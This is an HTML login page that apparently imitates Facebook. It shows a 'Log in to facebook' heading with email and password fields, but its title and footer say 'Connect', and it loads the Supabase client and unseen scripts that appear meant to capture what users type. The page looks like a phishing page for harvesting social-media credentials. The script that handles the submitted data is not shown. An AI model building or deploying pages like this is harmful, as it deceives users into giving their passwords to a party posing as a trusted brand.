
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Connect - Login</title>

    <link rel="stylesheet" href="book.css">

    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script src="supabase.js" defer></script>
    <script src="book.js" defer></script>
</head>

<body>

    <!-- Header -->
    <header class="header">
        <h1 class="brand">facebook</h1>
    </header>

    <!-- Main Login Section -->
    <main class="main-container">

        <section class="login-section">

            <h2>Log in to facebook</h2>

            <form id="loginForm">

             <input
    type="text"
    id="email"
    placeholder="Email address or mobile number"
    autocomplete="username"
    required
>

                <input
                    type="password"
                    id="password"
                    placeholder="Password"
                    autocomplete="current-password"
                    required
                >

                <!-- Error and success messages -->
                <p id="errorMessage" class="message" aria-live="polite"></p>

                <button type="submit" class="login-button">
                    Log in
                </button>

            </form>

            <a href="#" class="forgot-link">
                Forgot password?
            </a>

            <div class="separator"></div>

            <button
                type="button"
                class="create-button"
                onclick="window.location.href='signup.html'">
                Create new account
            </button>

            <p class="brand-footer">Connect Community</p>

        </section>

    </main>

    <!-- Footer -->
    <footer class="footer">


        <div class="footer-links">
            <a href="#">About</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Help</a>
            <a href="#">Contact</a>
          
        </div>

        <p>Connect © 2026. All rights reserved.</p>

    </footer>

</body>
</html>
